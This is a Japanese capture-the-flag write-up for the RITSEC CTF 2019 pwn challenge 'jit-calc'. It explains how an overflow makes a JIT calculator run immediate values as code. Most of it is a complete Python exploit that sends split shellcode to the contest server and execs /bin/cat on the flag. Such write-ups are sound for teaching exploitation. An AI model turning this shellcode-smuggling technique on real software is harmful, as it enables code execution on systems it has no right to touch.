# [pwn 500pts] jit-calc - RITSEC CTF 2019
64ビットバイナリで全部有効です。
```
$ checksec -f jit-calc
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   90 Symbols     No       0               6       jit-calc
```
指定した命令を書き込んでいき、実行できるプログラムです。いくつかのスロットに書き込めます。mov命令の即値などを決めることができますが、書き込みを終了する際は最後にretが書き込まれます。オーバーフローしそうになるとretせずに書き込みを終了するので次のスロットの命令を部分的に実行してしまい、結果として次のスロットの即値の部分が機械語として認識されます。あとは適当にシェルコードを分割すればヨシ。
```python
from ptrlib import *

def change_index(index):
    sock.sendlineafter("Run code", "1")
    sock.sendlineafter(")", str(index))
    return

def enter():
    sock.sendlineafter("Run code", "2")
    return

def write_imm(reg, value):
    assert reg in [1, 2]
    sock.sendlineafter("Value", "3")
    sock.sendlineafter("2", str(reg))
    sock.sendlineafter(":", str(value))
    return

def add_reg(type):
    sock.sendlineafter("Value", "2")
    sock.sendlineafter("2", str(type))
    return

def leave():
    sock.sendlineafter("Value", "1")
    return

def run_code():
    sock.sendlineafter("Run code", "4")
    return

elf = ELF("./jit-calc")
#sock = Process("./jit-calc")
sock = Socket("ctfchallenges.ritsec.club", 8000)
shellcode = [
    b'\x48\x31\xc0\x48\x31\xd2\xeb\x02', # xor rax, rax; xor rdx, rdx;
    b'\xb8\x00\x24\x60\x00\x90\xeb\x02', # mov eax, 0x602400
    b'\x48\x31\xdb\x48\x31\xc9\xeb\x02', # xor rbx, rbx; xor rcx, rcx;
    b'\xbb\x2f\x62\x69\x6e\x90\xeb\x02', # mov ebx, 0x6e69622f
    b'\xb9\x2f\x63\x61\x74\x90\xeb\x02', # mov ecx, 0x7461632f
    b'\x89\x18\x89\x48\x04\x90\xeb\x02', # mov [rax], ebx; mov [rax+4], ecx;
    b'\xbb\x00\x2f\x66\x6c\x90\xeb\x02', # mov ebx, 0x6c662f00
    b'\xb9\x61\x67\x00\x00\x90\xeb\x02', # mov ecx, 0x6761
    b'\x89\x58\x08\x89\x48\x0c\xeb\x02', # mov [rax+8], ebx; mov [rax+12], ecx;
    b'\xbb\x00\x24\x60\x00\x90\xeb\x02', # mov ebx, 0x602400
    b'\xb9\x09\x24\x60\x00\x90\xeb\x02', # mov ecx, 0x602409
    b'\x89\x58\x10\x89\x48\x18\xeb\x02', # mov [rax+16], ebx; mov [rax+24], ecx;
    b'\x48\x31\xff\x48\x31\xf6\xeb\x02', # xor rdi, rdi; xor rsi, rsi;
    b'\xbf\x00\x24\x60\x00\x90\xeb\x02', # mov edi, 0x602400
    b'\xbe\x10\x24\x60\x00\x90\xeb\x02', # mov esi, 0x602410
    b'\xb8\x3b\x00\x00\x00\x90\xeb\x02', # mov eax, 0x3b
    b'\x0f\x05' # syscall
]

logger.info("preparing shellcode...")
change_index(1)
enter()
for piece in shellcode:
    #logger.info(piece)
    write_imm(1, u64(piece))
leave()

logger.info("corrupting...")
change_index(0)
enter()
for i in range(3):
    add_reg(1)
for i in range(98):
    logger.info("Writing {}".format(i))
    write_imm(1, elf.section(".bss") + 0x200)
#leave()

# get the shell!
input()
sock.sendlineafter("Run code", "4")
sock.interactive()
```
`/bin/sh`を起動するシェルコードはリモートで動かなかったので運営に聞いたら`/bin/cat`で直接フラグを見てくれと頼まれたのでそんなシェルコードになってます。（は？）

# 感想
コンセプトは面白かったです。
